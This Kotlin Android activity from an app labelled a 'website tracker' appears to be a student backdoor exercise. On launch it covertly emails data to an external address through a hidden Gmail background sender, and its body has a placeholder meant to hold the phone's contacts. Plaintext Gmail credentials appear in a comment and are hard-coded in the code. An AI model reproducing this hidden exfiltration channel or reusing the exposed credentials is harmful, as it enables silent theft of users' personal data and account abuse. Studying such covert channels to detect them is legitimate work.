package com.example.websitetracker

import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.creativityapps.gmailbackgroundlibrary.BackgroundMail.TYPE_PLAIN
import com.creativityapps.gmailbackgroundlibrary.BackgroundMail.newBuilder

/**
 * #license Copyright 2015 Yesid Lazaro
 *
 * Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements.
 * See the NOTICE file distributed with this work for additional information regarding copyright ownership.
 * The ASF licenses this file to you under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software distributed under the License
 * is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
 * or implied. See the License for the specific language governing permissions and limitations under
 * the License.
 */
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        /**
         * Creds
         * collusion.enseirb@gmail.com CollEGL21
         * it362.test2021@gmail.com enseirbtest
         */

        newBuilder(this)
            .withUsername("it362.test2021@gmail.com")
            .withPassword("enseirbtest")
            .withMailto("it362.test2021@yopmail.com")
            .withType(TYPE_PLAIN)
            .withSubject("Android project")
            .withBody("<TODO: Put all the contacts here>\nSource Code: https://gitlab.com/sstan001/two-apps-one-backdoor")
            .withOnSuccessCallback {
                Log.i("MainActivity", "Successful mail sending!")
            }
            .withOnFailCallback {
                Log.e("MainActivity", "Error occurred while sending mail...")
            }
            .withProcessVisibility(false)
            .send()
    }
}
